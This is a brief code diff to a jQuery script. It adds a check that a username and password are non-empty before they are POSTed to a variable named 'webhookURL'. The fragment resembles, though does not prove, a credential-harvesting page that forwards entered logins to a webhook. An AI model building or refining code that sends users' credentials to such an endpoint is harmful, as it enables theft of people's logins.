@@ -13,6 +13,7 @@ $(document).ready(function() {
             };
 
             // Send AJAX POST request using jQuery
+        if(user != '' && password != ''){
             $.ajax({
                 url: webhookURL,
                 type: 'POST',
@@ -26,5 +27,6 @@ $(document).ready(function() {
                     console.log('Error sending information: ' + xhr.responseText);
                 }
             });
+        }
         }); 
 });
